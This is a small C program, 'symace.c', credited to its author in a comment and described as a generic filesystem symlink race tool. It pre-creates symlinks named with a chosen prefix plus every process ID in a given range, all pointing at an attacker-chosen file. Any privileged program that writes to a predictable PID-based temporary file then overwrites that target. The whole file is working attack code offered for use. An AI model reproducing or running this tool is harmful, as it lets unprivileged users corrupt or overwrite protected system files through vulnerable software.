/* symace.c -0.0.1 - A generic filesystem symlink/race thinger */

#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdio.h>

/* Please note that there is no error checking... */
/* By Andrew Griffiths (nullptr@tasmail.com)    */

int main(int argc, char **argv)
{
        char *overwrite;
        char *base;
        int start_pid, end_pid;
        int i, size;

        overwrite = strdup(argv[1]);
        size = strlen(argv[2]) + 8 + 1;
        base = malloc(size);
        start_pid=atoi(argv[3]);
        end_pid=atoi(argv[4]);

        for(i=start_pid;i<end_pid;i++) {
                memset(base, 0, size-1);
                snprintf(base, size-1, "%s%d", argv[2], i);
                if(symlink(overwrite, base)==-1) {
                        printf("Unable to create %s bailing\n", base);
                        exit(EXIT_FAILURE);
                }
        }
        printf("done\n");
}
